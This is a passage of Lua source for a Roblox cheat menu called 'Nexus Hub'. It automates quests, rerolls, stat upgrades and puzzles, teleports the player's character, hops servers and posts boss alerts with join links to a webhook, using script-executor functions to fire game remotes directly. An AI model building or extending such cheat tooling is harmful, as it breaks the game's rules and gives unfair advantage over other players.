fightingstyle_group:AddToggle({
    Name = 'Auto Gojo Quest',
    Default = false,
    Flag = 'AutoGojoQuest',
    Callback = function(v)
        Toggles.AutoGojoQuest = {Value = v}

        Thread('Styles.GojoQuest', SafeLoop('Gojo Quest', Func_AutoGojoQuest), v)
    end,
})
fightingstyle_group = fightingstyle:AddGroup({Name = 'Gojo V2 Style'})
fightingstyle_group:AddDropdown({
    Name = 'Summon Difficulty (Gojo V2)',
    Options = Tables.DiffList,
    Default = 'Normal',
    Flag = 'SelectedGojoV2Diff',
    Callback = function(v)
        Options.SelectedGojoV2Diff = v
    end,
})
fightingstyle_group:AddToggle({
    Name = 'Auto Gojo V2 (Fully)',
    Default = false,
    Flag = 'AutoGojoV2Full',
    Callback = function(v)
        Toggles.AutoGojoV2Full = {Value = v}

        Thread('Styles.GojoV2Full', SafeLoop('Gojo V2 Full', Func_AutoGojoV2Full), v)
    end,
})
fightingstyle_group = fightingstyle:AddGroup({Name = 'Sukuna & Yuji Style'})
fightingstyle_group:AddToggle({
    Name = 'Auto Get Sukuna Items',
    Default = false,
    Flag = 'AutoSukunaGetItems',
    Callback = function(v)
        Toggles.AutoSukunaGetItems = {Value = v}

        Thread('Styles.SukunaGetItems', SafeLoop('Sukuna Get Items', Func_AutoSukunaGetItems), v)
    end,
})
fightingstyle_group:AddToggle({
    Name = 'Auto Sukuna Quest',
    Default = false,
    Flag = 'AutoSukunaQuest',
    Callback = function(v)
        Toggles.AutoSukunaQuest = {Value = v}

        Thread('Styles.SukunaQuest', SafeLoop('Sukuna Quest', Func_AutoSukunaQuest), v)
    end,
})
fightingstyle_group:AddToggle({
    Name = 'Auto Yuji (Fully)',
    Default = false,
    Flag = 'AutoYujiGetItems',
    Callback = function(v)
        Toggles.AutoYujiGetItems = {Value = v}

        Thread('Styles.YujiGetItems', SafeLoop('Yuji Get Items', Func_AutoYujiGetItems), v)
    end,
})
fightingstyle_group = fightingstyle:AddGroup({Name = 'Sukuna V2 Style'})
fightingstyle_group:AddDropdown({
    Name = 'Summon Difficulty (Sukuna V2)',
    Options = Tables.DiffList,
    Default = 'Normal',
    Flag = 'SelectedSukunaV2Diff',
    Callback = function(v)
        Options.SelectedSukunaV2Diff = v
    end,
})
fightingstyle_group:AddToggle({
    Name = 'Auto Sukuna V2 (Fully)',
    Default = false,
    Flag = 'AutoSukunaV2Full',
    Callback = function(v)
        Toggles.AutoSukunaV2Full = {Value = v}

        Thread('Styles.SukunaV2Full', SafeLoop('Sukuna V2 Full', Func_AutoSukunaV2Full), v)
    end,
})
fightingstyle_group = fightingstyle:AddGroup({Name = 'Qin Shi Style'})
fightingstyle_group:AddToggle({
    Name = 'Auto Qin Shi (Fully)',
    Default = false,
    Flag = 'AutoQinShiFull',
    Callback = function(v)
        Toggles.AutoQinShiFull = {Value = v}

        Thread('Styles.QinShiFull', SafeLoop('Qin Shi Full', Func_AutoQinShiFull), v)
    end,
})
fightingstyle_group:AddButton({
    Name = 'Exchange 250 Boss Tickets \u{2192} Qin Shi',
    Callback = function()
        UI:Notify({
            Title = 'Qin Shi',
            Description = 'Sending exchange request...',
            Duration = 3,
        })

        local ok, err = pcall(function()
            game:GetService('ReplicatedStorage'):WaitForChild('Remotes'):WaitForChild('ExchangeItem'):InvokeServer('Qin Shi')
        end)

        if ok then
            UI:Notify({
                Title = 'Qin Shi',
                Description = 'Success! Qin Shi style unlocked via Boss Tickets.',
                Duration = 5,
            })
        else
            UI:Notify({
                Title = 'Qin Shi',
                Description = 'Exchange failed: ' .. tostring(err),
                Duration = 5,
            })
        end
    end,
})
fightingstyle_group = fightingstyle:AddGroup({Name = 'Alucard Style'})
fightingstyle_group:AddToggle({
    Name = 'Auto Alucard Style (Fully)',
    Default = false,
    Flag = 'AutoAlucardFull',
    Callback = function(v)
        Toggles.AutoAlucardFull = {Value = v}

        Thread('Styles.AlucardFull', SafeLoop('Alucard Full', Func_AutoAlucardFull), v)
    end,
})
fightingstyle_group = fightingstyle:AddGroup({Name = 'Gilgamesh Style'})
fightingstyle_group:AddDropdown({
    Name = 'Gilgamesh Difficulty',
    Options = Tables.DiffList,
    Default = 'Normal',
    Flag = 'SelectedGilgameshDiff',
    Callback = function(v)
        Options.SelectedGilgameshDiff = v
    end,
})
fightingstyle_group:AddToggle({
    Name = 'Auto Gilgamesh (Fully)',
    Default = false,
    Flag = 'AutoGilgameshFull',
    Callback = function(v)
        Toggles.AutoGilgameshFull = {Value = v}

        Thread('Styles.GilgameshFull', SafeLoop('Gilgamesh Full', Func_AutoGilgameshFull), v)
    end,
})
fightingstyle_group = fightingstyle:AddGroup({Name = 'Anos Style'})
fightingstyle_group:AddDropdown({
    Name = 'Anos Difficulty',
    Options = Tables.DiffList,
    Default = 'Normal',
    Flag = 'SelectedAnosDiff',
    Callback = function(v)
        Options.SelectedAnosDiff = v
    end,
})
fightingstyle_group:AddToggle({
    Name = 'Auto Anos (Fully)',
    Default = false,
    Flag = 'AutoAnosFull',
    Callback = function(v)
        Toggles.AutoAnosFull = {Value = v}

        Thread('Styles.AnosFull', SafeLoop('Anos Full', Func_AutoAnosFull), v)
    end,
})
fightingstyle_group = fightingstyle:AddGroup({Name = 'Blessed Maiden Style'})
fightingstyle_group:AddDropdown({
    Name = 'Blessed Maiden Difficulty',
    Options = Tables.DiffList,
    Default = 'Normal',
    Flag = 'SelectedBlessedMaidenDiff',
    Callback = function(v)
        Options.SelectedBlessedMaidenDiff = v
    end,
})
fightingstyle_group:AddToggle({
    Name = 'Auto Blessed Maiden (Fully)',
    Default = false,
    Flag = 'AutoBlessedMaidenFull',
    Callback = function(v)
        Toggles.AutoBlessedMaidenFull = {Value = v}

        Thread('Styles.BlessedMaidenFull', SafeLoop('Blessed Maiden Full', Func_AutoBlessedMaidenFull), v)
    end,
})
fightingstyle_group = fightingstyle:AddGroup({Name = 'Saber Alter Style'})
fightingstyle_group:AddDropdown({
    Name = 'Saber Alter Difficulty',
    Options = Tables.DiffList,
    Default = 'Normal',
    Flag = 'SelectedSaberAlterDiff',
    Callback = function(v)
        Options.SelectedSaberAlterDiff = v
    end,
})
fightingstyle_group:AddToggle({
    Name = 'Auto Saber Alter (Fully)',
    Default = false,
    Flag = 'AutoSaberAlterFull',
    Callback = function(v)
        Toggles.AutoSaberAlterFull = {Value = v}

        Thread('Styles.SaberAlterFull', SafeLoop('Saber Alter Full', Func_AutoSaberAlterFull), v)
    end,
})
fightingstyle_group = fightingstyle:AddGroup({Name = 'Strongest Shinobi Style'})
fightingstyle_group:AddToggle({
    Name = 'Auto Strongest Shinobi (Fully)',
    Default = false,
    Flag = 'AutoStrongestShiobiFull',
    Callback = function(v)
        Toggles.AutoStrongestShiobiFull = {Value = v}

        Thread('Styles.StrongestShinobiFull', SafeLoop('Strongest Shinobi Full', Func_AutoStrongestShinobiFull), v)
    end,
})
fightingstyle_group = fightingstyle:AddGroup({Name = 'Moon Slayer Style'})
fightingstyle_group:AddDropdown({
    Name = 'Moon Slayer Difficulty',
    Options = Tables.DiffList,
    Default = 'Normal',
    Flag = 'SelectedMoonSlayerDiff',
    Callback = function(v)
        Options.SelectedMoonSlayerDiff = v
    end,
})
fightingstyle_group:AddToggle({
    Name = 'Auto Moon Slayer (Fully)',
    Default = false,
    Flag = 'AutoMoonSlayerFull',
    Callback = function(v)
        Toggles.AutoMoonSlayerFull = {Value = v}

        Thread('Styles.MoonSlayerFull', SafeLoop('Moon Slayer Full', Func_AutoMoonSlayerFull), v)
    end,
})

local PuzzleTab = CreateNexusPage({Name = 'Puzzles'})

PuzzleTab_group = PuzzleTab:AddGroup({Name = 'Puzzle Solvers'})

function Func_AutoPuzzle(puzzleType, minLevel)
    while Toggles['Auto' .. puzzleType .. 'Puzzle'] and Toggles['Auto' .. puzzleType .. 'Puzzle'].Value do
        if not Support.Proximity then
            UI:Notify({
                Title = 'Error',
                Description = 'fireproximityprompt not supported.',
                Duration = 3,
            })

            if Toggles['Auto' .. puzzleType .. 'Puzzle'] then
                Toggles['Auto' .. puzzleType .. 'Puzzle'].Value = false
            end

            break
        end
        if minLevel and Plr.Data.Level.Value < minLevel then
            UI:Notify({
                Title = 'Error',
                Description = 'Level ' .. minLevel .. ' required!',
                Duration = 3,
            })

            if Toggles['Auto' .. puzzleType .. 'Puzzle'] then
                Toggles['Auto' .. puzzleType .. 'Puzzle'].Value = false
            end

            break
        end

        UniversalPuzzleSolver(puzzleType)

        if Toggles['Auto' .. puzzleType .. 'Puzzle'] then
            Toggles['Auto' .. puzzleType .. 'Puzzle'].Value = false
        end

        break
    end
end

PuzzleTab_group:AddToggle({
    Name = 'Auto Dungeon Puzzle',
    Default = false,
    Flag = 'AutoDungeonPuzzle',
    Callback = function(v)
        Toggles.AutoDungeonPuzzle = {Value = v}

        Thread('AutoDungeonPuzzle', SafeLoop('Dungeon Puzzle', function()
            Func_AutoPuzzle('Dungeon', 5000)
        end), v)
    end,
})
PuzzleTab_group:AddToggle({
    Name = 'Auto Slime Key Puzzle',
    Default = false,
    Flag = 'AutoSlimePuzzle',
    Callback = function(v)
        Toggles.AutoSlimePuzzle = {Value = v}

        Thread('AutoSlimePuzzle', SafeLoop('Slime Puzzle', function()
            Func_AutoPuzzle('Slime', nil)
        end), v)
    end,
})
PuzzleTab_group:AddToggle({
    Name = 'Auto Demonite Puzzle',
    Default = false,
    Flag = 'AutoDemonitePuzzle',
    Callback = function(v)
        Toggles.AutoDemonitePuzzle = {Value = v}

        Thread('AutoDemonitePuzzle', SafeLoop('Demonite Puzzle', function()
            Func_AutoPuzzle('Demonite', nil)
        end), v)
    end,
})
PuzzleTab_group:AddToggle({
    Name = 'Auto Hogyoku Puzzle',
    Default = false,
    Flag = 'AutoHogyokuPuzzle',
    Callback = function(v)
        Toggles.AutoHogyokuPuzzle = {Value = v}

        Thread('AutoHogyokuPuzzle', SafeLoop('Hogyoku Puzzle', function()
            Func_AutoPuzzle('Hogyoku', 8500)
        end), v)
    end,
})

local StatsTab = CreateNexusPage({Name = 'Stats'})

StatsTab_group = StatsTab:AddGroup({Name = 'Allocate Stat Points'})
StatsTab_group:AddMultiDropdown({
    Name = 'Select Stats',
    Options = {
        'Melee',
        'Defense',
        'Sword',
        'Power',
    },
    Default = {
        'Melee',
    },
        Flag = 'SelectedStats',
    Callback = function(v)
        Options.SelectedStats = ToSet(v)
    end,
})

Options.SelectedStats = {Melee = true}

StatsTab_group:AddToggle({
    Name = 'Auto UP Stats',
    Default = false,
    Flag = 'AutoStats',
    Callback = function(v)
        Toggles.AutoStats = {Value = v}

        Thread('AutoStats', SafeLoop('Auto Stats', Func_AutoStats), v)
    end,
})
StatsTab_group = StatsTab:AddGroup({Name = 'Gem Stat Reroll'})
StatsTab_group:AddMultiDropdown({
    Name = 'Select Gem Stats',
    Options = Tables.GemStat,
    Default = {},
        Flag = 'SelectedGemStats',
    Callback = function(v)
        Options.SelectedGemStats = ToSet(v)
    end,
})
StatsTab_group:AddMultiDropdown({
    Name = 'Target Rank(s)',
    Options = Tables.GemRank,
    Default = {},
        Flag = 'SelectedRank',
    Callback = function(v)
        Options.SelectedRank = ToSet(v)
    end,
})
StatsTab_group:AddSlider({
    Name = 'Roll Delay',
    Min = 0.01,
    Max = 1,
    Default = 0.1,
    Flag = 'StatsRollCD',
    Callback = function(v)
        Options.StatsRollCD = v
    end,
})
StatsTab_group:AddToggle({
    Name = 'Auto Roll Stats',
    Default = false,
    Flag = 'AutoRollStats',
    Callback = function(v)
        Toggles.AutoRollStats = {Value = v}

        Thread('AutoRollStats', SafeLoop('Stat Roll', AutoRollStatsLoop), v)
    end,
})
StatsTab_group = StatsTab:AddGroup({Name = 'Auto Ascend'})

local AscendStatusLabel = StatsTab_group:AddLabel({Text = 'Ascend: --', Wrap = true})

local function UpdateAscendLabels(data)
    if not data then
        return
    end
    if data.isMaxed then
        AscendStatusLabel.Text = '- Max Ascension Reached!'

        return
    end

    local reqs = data.requirements or {}
    local lines = {}

    for i = 1, #reqs do
        local req = reqs[i]

        if req then
            local txt = req.display and req.display:gsub('<[^>]+>', '') or 'Requirement ' .. i
            local status = req.completed and '\u{2705}' or '\u{274c}'
            local prog = string.format('(%s/%s)', CommaFormat(req.current or 0), CommaFormat(req.needed or 0))

            table.insert(lines, string.format('- %s %s %s', txt, prog, status))
        end
    end

    AscendStatusLabel.Text = table.concat(lines, '\n')
end

StatsTab_group:AddToggle({
    Name = 'Auto Ascend',
    Default = false,
    Flag = 'AutoAscend',
    Callback = function(v)
        Toggles.AutoAscend = {Value = v}

        if v then
            Thread('AutoAscend.Poll', function()
                while Toggles.AutoAscend and Toggles.AutoAscend.Value do
                    pcall(function()
                        local data = Remotes.ReqAscend:InvokeServer()

                        if data then
                            UpdateAscendLabels(data)

                            if data.isMaxed then
                                Toggles.AutoAscend.Value = false

                                UI:Notify({
                                    Title = 'Ascend',
                                    Description = 'Max Ascension Reached!',
                                    Duration = 5,
                                })

                                return
                            end
                            if data.allMet then
                                UI:Notify({
                                    Title = 'Ascend',
                                    Description = 'Ascending to: ' .. tostring(data.nextRankName),
                                    Duration = 5,
                                })
                                Remotes.Ascend:FireServer()
                                task.wait(2)
                            end
                        end
                    end)
                    task.wait(3)
                end
            end, true)
        else
            Thread('AutoAscend.Poll', nil, false)
            pcall(function()
                Remotes.CloseAscend:FireServer()
            end)
        end
    end,
})
StatsTab_group = StatsTab:AddGroup({Name = 'Skill Tree & Milestones'})
StatsTab_group:AddToggle({
    Name = 'Auto Skill Tree',
    Default = false,
    Flag = 'AutoSkillTree',
    Callback = function(v)
        Toggles.AutoSkillTree = {Value = v}

        Thread('AutoSkillTree', SafeLoop('Skill Tree', Func_AutoSkillTree), v)
    end,
})
StatsTab_group:AddToggle({
    Name = 'Auto Artifact Milestone',
    Default = false,
    Flag = 'ArtifactMilestone',
    Callback = function(v)
        Toggles.ArtifactMilestone = {Value = v}

        Thread('ArtifactMilestone', Func_ArtifactMilestone, v)
    end,
})
StatsTab_group = StatsTab:AddGroup({Name = 'Auto Power'})

local PowerCurrentLabel = StatsTab_group:AddLabel({Text = 'Current Power: None'})

task.spawn(function()
    while true do
        task.wait(2)
        PowerCurrentLabel.Text = 'Current Power: ' .. ((Shared.CurrentPower and Shared.CurrentPower.Name) or 'None')
    end
end)
StatsTab_group:AddMultiDropdown({
    Name = 'Select Target Power(s)',
    Options = Tables.PowerList,
    Default = {},
        Flag = 'SelectedPower',
    Callback = function(v)
        Options.SelectedPower = v
    end,
})
StatsTab_group:AddSlider({
    Name = 'Power Roll Delay',
    Min = 0.01,
    Max = 1,
    Default = 0.3,
    Flag = 'PowerRollCD',
    Callback = function(v)
        Options.PowerRollCD = v
    end,
})
StatsTab_group:AddToggle({
    Name = 'Auto Roll Power',
    Default = false,
    Flag = 'AutoPower',
    Callback = function(v)
        Toggles.AutoPower = {Value = v}

        Thread('AutoPower', SafeLoop('Auto Power', Func_AutoPower), v)
    end,
})
StatsTab_group = StatsTab:AddGroup({Name = 'Auto Spec Passive'})
StatsTab_group:AddMultiDropdown({
    Name = 'Select Weapon(s)',
    Options = Tables.AllOwnedWeapons,
    Default = {},
        Flag = 'SelectedPassive_ZH',
    Callback = function(v)
        Options.SelectedPassive_ZH = ToSet(v)
    end,
})
StatsTab_group:AddMultiDropdown({
    Name = 'Target Passive(s)',
    Options = Tables.SpecPassive,
    Default = {},
        Flag = 'SelectedSpec_ZH',
    Callback = function(v)
        Options.SelectedSpec_ZH = ToSet(v)
    end,
})
StatsTab_group:AddSlider({
    Name = 'Spec Roll Delay',
    Min = 0.01,
    Max = 1,
    Default = 0.1,
    Flag = 'SpecRollCD_ZH',
    Callback = function(v)
        Options.SpecRollCD_ZH = v
    end,
})
StatsTab_group:AddToggle({
    Name = 'Auto Reroll Passive',
    Default = false,
    Flag = 'AutoSpec_ZH',
    Callback = function(v)
        Toggles.AutoSpec_ZH = {Value = v}

        Thread('AutoSpecPassive_ZH', SafeLoop('Spec Passive ZH', AutoSpecPassiveLoop_ZH), v)
    end,
})

local RollTab = CreateNexusPage({Name = 'Rolls'})

RollTab_group = RollTab:AddGroup({Name = 'Roll Settings'})
RollTab_group:AddSlider({
    Name = 'Roll Delay',
    Min = 0.01,
    Max = 1,
    Default = 0.3,
    Flag = 'RollCD',
    Callback = function(v)
        Options.RollCD = v
    end,
})
RollTab_group = RollTab:AddGroup({Name = 'Trait'})
RollTab_group:AddMultiDropdown({
    Name = 'Target Trait(s)',
    Options = Tables.TraitList,
    Default = {},
        Flag = 'SelectedTrait',
    Callback = function(v)
        Options.SelectedTrait = ToSet(v)
        SyncTraitAutoSkip()
    end,
})
RollTab_group:AddToggle({
    Name = 'Auto Roll Trait',
    Default = false,
    Flag = 'AutoTrait',
    Callback = function(v)
        Toggles.AutoTrait = {Value = v}

        EnsureRollManager()
    end,
})
RollTab_group = RollTab:AddGroup({Name = 'Race'})
RollTab_group:AddMultiDropdown({
    Name = 'Target Race(s)',
    Options = Tables.RaceList,
    Default = {},
        Flag = 'SelectedRace',
    Callback = function(v)
        Options.SelectedRace = ToSet(v)
        SyncRaceSettings()
    end,
})
RollTab_group:AddToggle({
    Name = 'Auto Roll Race',
    Default = false,
    Flag = 'AutoRace',
    Callback = function(v)
        Toggles.AutoRace = {Value = v}

        EnsureRollManager()
    end,
})
RollTab_group = RollTab:AddGroup({Name = 'Clan'})
RollTab_group:AddMultiDropdown({
    Name = 'Target Clan(s)',
    Options = Tables.ClanList,
    Default = {},
        Flag = 'SelectedClan',
    Callback = function(v)
        Options.SelectedClan = ToSet(v)
        SyncClanSettings()
    end,
})
RollTab_group:AddToggle({
    Name = 'Auto Roll Clan',
    Default = false,
    Flag = 'AutoClan',
    Callback = function(v)
        Toggles.AutoClan = {Value = v}

        EnsureRollManager()
    end,
})
RollTab_group = RollTab:AddGroup({Name = 'Bloodline'})
RollTab_group:AddMultiDropdown({
    Name = 'Target Bloodline(s)',
    Options = Tables.BloodlineList or {},
    Default = {},
        Flag = 'SelectedBloodline',
    Callback = function(v)
        Options.SelectedBloodline = ToSet(v)
    end,
})
RollTab_group:AddToggle({
    Name = 'Auto Roll Bloodline',
    Default = false,
    Flag = 'AutoBloodline',
    Callback = function(v)
        Toggles.AutoBloodline = {Value = v}

        EnsureRollManager()
    end,
})

local IslandTPTab = CreateNexusPage({Name = 'Islands'})

IslandTPTab_group = IslandTPTab:AddGroup({Name = 'Island Teleport'})
IslandTPTab_group:AddDropdown({
    Name = 'Select Island',
    Options = Tables.IslandList,
    Default = Tables.IslandList[1] or '',
    Flag = 'SelectedIsland',
    Callback = function(v)
        if v then
            Remotes.TP_Portal:FireServer(v)
        end
    end,
})
IslandTPTab_group = IslandTPTab:AddGroup({Name = "NPC's Teleport"})

local selectedAllNPC = ''

IslandTPTab_group:AddDropdown({
    Name = 'All NPCs',
    Options = Tables.AllNPCList,
    Default = '',
    Flag = 'SelectedMiscAllNPC',
    Callback = function(v)
        selectedAllNPC = tostring(v)
    end,
})
IslandTPTab_group:AddButton({
    Name = 'Teleport to NPC',
    Callback = function()
        if selectedAllNPC == '' then
            return
        end

        SafeTeleportToNPC(selectedAllNPC)
    end,
})
IslandTPTab_group:AddButton({
    Name = 'Refresh NPC List',
    Callback = function()
        table.clear(Tables.AllNPCList)

        for _, v in ipairs(PATH.InteractNPCs:GetChildren())do
            table.insert(Tables.AllNPCList, v.Name)
        end

        table.sort(Tables.AllNPCList)
    end,
})

local SEA1_PLACE_ID = 77747658251236
local SEA2_PLACE_ID = 130167267952199

local function IsInSea2()
    return game.PlaceId == SEA2_PLACE_ID
end
local function IsInSea1()
    return game.PlaceId == SEA1_PLACE_ID
end

function Func_AutoTPSea2()
    while Toggles.AutoTPSea2 and Toggles.AutoTPSea2.Value do
        local char = GetCharacter()
        local root = char and char:FindFirstChild('HumanoidRootPart')

        if not root then
            task.wait(0.5)

            continue
        end
        if IsInSea2() then
            Toggles.AutoTPSea2.Value = false

            break
        end

        root.CFrame = CFrame.new(-828, 323, -2246)
        root.AssemblyLinearVelocity = Vector3.zero

        task.wait(0.8)

        local prompt = nil

        for _, obj in pairs(workspace:GetDescendants())do
            if obj:IsA('ProximityPrompt') then
                local at = obj.ActionText:lower()
                local n = obj.Name:lower()

                if at:find('sea 2') or at:find('enter sea') or n:find('sea2') then
                    prompt = obj

                    break
                end
            end
        end

        if prompt then
            local promptPart = prompt.Parent

            if promptPart and promptPart:IsA('BasePart') then
                root.CFrame = CFrame.new(promptPart.Position)
                root.AssemblyLinearVelocity = Vector3.zero

                task.wait(0.3)
            end

            pcall(function()
                fireproximityprompt(prompt)
            end)
            task.wait(0.3)
            pcall(function()
                prompt.HoldDuration = 0

                prompt:InputHoldBegin()
                task.wait(0.1)
                prompt:InputHoldEnd()
            end)
        end

        task.wait(1)

        Toggles.AutoTPSea2.Value = false

        break
    end
end
function Func_AutoTPSea1()
    while Toggles.AutoTPSea1 and Toggles.AutoTPSea1.Value do
        local char = GetCharacter()
        local root = char and char:FindFirstChild('HumanoidRootPart')

        if not root then
            task.wait(0.5)

            continue
        end
        if IsInSea1() then
            Toggles.AutoTPSea1.Value = false

            break
        end

        root.CFrame = CFrame.new(-279, 323, -3057)
        root.AssemblyLinearVelocity = Vector3.zero

        task.wait(0.8)

        local prompt = nil

        for _, obj in pairs(workspace:GetDescendants())do
            if obj:IsA('ProximityPrompt') then
                local at = obj.ActionText:lower()
                local n = obj.Name:lower()

                if at:find('sea 1') or at:find('go back') or at:find('enter sea 1') or n:find('sea1') then
                    prompt = obj

                    break
                end
            end
        end

        if prompt then
            local promptPart = prompt.Parent

            if promptPart and promptPart:IsA('BasePart') then
                root.CFrame = CFrame.new(promptPart.Position)
                root.AssemblyLinearVelocity = Vector3.zero

                task.wait(0.3)
            end

            pcall(function()
                fireproximityprompt(prompt)
            end)
            task.wait(0.3)
            pcall(function()
                prompt.HoldDuration = 0

                prompt:InputHoldBegin()
                task.wait(0.1)
                prompt:InputHoldEnd()
            end)
        end

        task.wait(1)

        Toggles.AutoTPSea1.Value = false

        break
    end
end

IslandTPTab_group = IslandTPTab:AddGroup({Name = 'World Sea Teleport'})
IslandTPTab_group:AddButton({
    Name = 'Teleport to Sea 2',
    Callback = function()
        if IsInSea2() then
            UI:Notify({
                Title = 'Sea TP',
                Description = 'Already in Sea 2!',
                Duration = 3,
            })

            return
        end

        UI:Notify({
            Title = 'Sea TP',
            Description = 'Teleporting to Sea 2...',
            Duration = 3,
        })
        task.spawn(Func_AutoTPSea2)
    end,
})
IslandTPTab_group:AddButton({
    Name = 'Teleport to Sea 1',
    Callback = function()
        if IsInSea1() then
            UI:Notify({
                Title = 'Sea TP',
                Description = 'Already in Sea 1!',
                Duration = 3,
            })

            return
        end

        UI:Notify({
            Title = 'Sea TP',
            Description = 'Teleporting to Sea 1...',
            Duration = 3,
        })
        task.spawn(Func_AutoTPSea1)
    end,
})

local GraphicsTab = CreateNexusPage({Name = 'Graphics'})

GraphicsTab_group = GraphicsTab:AddGroup({Name = 'FPS'})
GraphicsTab_group:AddToggle({
    Name = 'FPS Cap',
    Default = false,
    Flag = 'LimitFPS',
    Callback = function(v)
        Toggles.LimitFPS = {Value = v}

        if not v and setfpscap then
            setfpscap(999)
        end
    end,
})
GraphicsTab_group:AddSlider({
    Name = 'Max FPS',
    Min = 5,
    Max = 360,
    Default = 60,
    Flag = 'LimitFPSValue',
    Callback = function(v)
        Options.LimitFPSValue = v

        if Toggles.LimitFPS and Toggles.LimitFPS.Value and setfpscap then
            setfpscap(v)
        end
    end,
})
GraphicsTab_group:AddToggle({
    Name = 'FPS Boost',
    Default = false,
    Flag = 'FPSBoost',
    Callback = function(v)
        Toggles.FPSBoost = {Value = v}

        ApplyFPSBoost(v)
    end,
})
GraphicsTab_group:AddToggle({
    Name = 'FPS Boost [Autofarm]',
    Default = false,
    Flag = 'FPSBoost_AF',
    Callback = function(v)
        Toggles.FPSBoost_AF = {Value = v}

        if v then
            ApplyIslandWipe()
        end
    end,
})
GraphicsTab_group = GraphicsTab:AddGroup({Name = 'World'})
GraphicsTab_group:AddToggle({
    Name = 'Fullbright',
    Default = false,
    Flag = 'Fullbright',
    Callback = function(v)
        Toggles.Fullbright = {Value = v}
    end,
})
GraphicsTab_group:AddToggle({
    Name = 'No Fog',
    Default = false,
    Flag = 'NoFog',
    Callback = function(v)
        Toggles.NoFog = {Value = v}
    end,
})
GraphicsTab_group:AddToggle({
    Name = 'Disable 3D Render',
    Default = false,
    Flag = 'Disable3DRender',
    Callback = function(v)
        Toggles.Disable3DRender = {Value = v}

        RunService:Set3dRenderingEnabled(not v)
    end,
})
GraphicsTab_group:AddToggle({
    Name = 'Time Override',
    Default = false,
    Flag = 'OverrideTime',
    Callback = function(v)
        Toggles.OverrideTime = {Value = v}
    end,
})
GraphicsTab_group:AddSlider({
    Name = 'Time of Day',
    Min = 0,
    Max = 24,
    Default = 12,
    Flag = 'OverrideTimeValue',
    Callback = function(v)
        Options.OverrideTimeValue = v

        if Toggles.OverrideTime and Toggles.OverrideTime.Value then
            Lighting.ClockTime = v
        end
    end,
})

local ServerTab = CreateNexusPage({Name = 'Server'})

ServerTab_group = ServerTab:AddGroup({Name = 'Server Config'})
ServerTab_group:AddSlider({
    Name = 'Memory Limit (MB)',
    Min = 1000,
    Max = 20000,
    Default = 3000,
    Flag = 'MemoryLimit',
    Callback = function(v)
        Options.MemoryLimit = v
    end,
})
ServerTab_group:AddToggle({
    Name = 'Auto Rejoin (Memory)',
    Default = false,
    Flag = 'AutoRejoinMemory',
    Callback = function(v)
        Toggles.AutoRejoinMemory = {Value = v}

        Thread('AutoRejoinMemory', SafeLoop('AutoRejoinMemory', function()
            local StatsService = game:GetService('Stats')
            local TARGET_PLACE_ID = 77747658251236

            while Toggles.AutoRejoinMemory and Toggles.AutoRejoinMemory.Value do
                local currentMemory = StatsService:GetTotalMemoryUsageMb()
                local limit = Options.MemoryLimit or 3000

                if currentMemory >= limit then
                    UI:Notify({
                        Title = 'Memory Limit',
                        Description = string.format('Memory reached %.0fMB. Rejoining...', currentMemory),
                        Duration = 5,
                    })
                    task.wait(3)
                    TeleportService:Teleport(TARGET_PLACE_ID, Plr)
                end

                task.wait(2)
            end
        end), v)
    end,
})
ServerTab_group:AddButton({
    Name = 'Server Hop',
    Callback = function()
        local Http = game:GetService('HttpService')
        local TS = game:GetService('TeleportService')
        local TargetPlaceID = 77747658251236
        local JobID = game.JobId

        local function ListServers(cursor)
            local url = 'https://games.roblox.com/v1/games/' .. TargetPlaceID .. '/servers/Public?sortOrder=Asc&limit=100'

            if cursor and cursor ~= '' then
                url = url .. '&cursor=' .. cursor
            end

            local ok, res = pcall(function()
                return Http:JSONDecode(game:HttpGet(url))
            end)

            if ok then
                return res
            end
        end

        local lowestServer = nil
        local lowestPlayers = math.huge
        local nextCursor = nil

        repeat
            local data = ListServers(nextCursor)

            if not data then
                break
            end

            for _, server in pairs(data.data)do
                if server.id ~= JobID and server.playing < server.maxPlayers then
                    if server.playing < lowestPlayers then
                        lowestPlayers = server.playing
                        lowestServer = server
                    end
                end
            end

            nextCursor = data.nextPageCursor
        until not nextCursor or lowestPlayers <= 1

        if lowestServer then
            pcall(function()
                TS:TeleportToPlaceInstance(TargetPlaceID, lowestServer.id, Plr)
            end)
        else
            pcall(function()
                TS:Teleport(TargetPlaceID, Plr)
            end)
        end
    end,
})

local WorldBossWebhook = ''
local SeaBossWebhook = ''
local NotifiedBosses = {}
local SeaBossKeywordsWebhook = {
    'Kraken',
    'SeaSerpent',
    'seaserpent',
    'kraken',
    'Sea Serpent',
}
local SpecialBossWebhookList = {
    {
        label = 'Strongest Shinobi Boss',
        match = 'strongestshinobi',
        island = 'Ninja',
    },
    {
        label = 'Cosmic Being Boss',
        match = 'cosmicbeingboss',
        island = 'Boss',
    },
    {
        label = 'Alucard Boss',
        match = 'alucardBoss',
        island = 'Sailor',
    },
    {
        label = 'Jinwoo Boss',
        match = 'jinwooboss',
        island = 'Sailor',
    },
    {
        label = 'Aizen Boss',
        match = 'aizenboss',
        island = 'Hollow',
    },
    {
        label = 'Gojo Boss',
        match = 'gojoboss',
        island = 'Shibuya',
    },
    {
        label = 'Sukuna Boss',
        match = 'sukunaboss',
        island = 'Shibuya',
    },
    {
        label = 'Yuji Boss',
        match = 'yujiboss',
        island = 'Boss',
    },
}

local function GetJoinCodes()
    local jobId = game.JobId
    local placeId = game.PlaceId
    local cleanId = jobId:gsub('-', '')
    local code = 'Nexus_' .. cleanId
    local webLink = string.format('https://www.roblox.com/games/%s/game?gameInstanceId=%s', placeId, jobId)

    return code, webLink
end
local function SendWebhook(url, title, description, color)
    local plrCount = #game:GetService('Players'):GetPlayers()
    local maxPlrs = game:GetService('Players').MaxPlayers
    local code, webLink = GetJoinCodes()
    local fullDesc = description .. '\n\n**Player Count:** `' .. plrCount .. '/' .. maxPlrs .. '`' .. '\n\n**Join Code:**\n```\n' .. code .. '\n```' .. '\n> \u{1f4cb} Copy the join code and paste it in **Nexus Hub \u{2192} Misc \u{2192} Webhook \u{2192} Join Code** textbox to teleport to this server!' .. '\n**[Click to Join](' .. webLink .. ')**'
    local data = {
        embeds = {
            {
                title = title,
                description = fullDesc,
                color = color or 16711680,
                footer = {
                    text = 'Nexus Hub \u{2022} ' .. os.date('%X'),
                },
            },
        },
    }
    local body = game:GetService('HttpService'):JSONEncode(data)
    local reqFunc = (syn and syn.request) or (http and http.request) or http_request or request

    if typeof(reqFunc) == 'function' then
        pcall(function()
            reqFunc({
                Url = url,
                Method = 'POST',
                Headers = {
                    ['Content-Type'] = 'application/json',
                },
                Body = body,
            })
        end)
    end
end
local function IsSeaBoss(npcName)
    local clean = npcName:lower():gsub('%s+', '')

